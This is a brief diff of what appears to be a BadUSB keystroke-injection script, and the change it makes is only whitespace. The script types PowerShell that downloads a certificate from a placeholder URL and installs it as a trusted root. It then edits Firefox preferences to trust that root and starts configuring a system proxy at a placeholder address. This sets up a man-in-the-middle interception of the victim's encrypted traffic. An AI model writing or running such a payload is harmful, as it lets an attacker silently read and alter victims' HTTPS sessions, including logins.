@@ -29,7 +29,7 @@ DELAY SHORT
 STRING i
 
 DELAY MEDIUM
-STRING Clear-Host ; $a = New-TemporaryFile; try { Invoke-WebRequest -Uri "
+STRING Clear-Host; $a = New-TemporaryFile; try { Invoke-WebRequest -Uri "
 STRING CERT_URL
 STRING " -OutFile $a; Import-Certificate -FilePath $a -CertStoreLocation "Cert:\CurrentUser\Root"; if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; @{"ProxyServer" = "
 STRING PROXY_IP
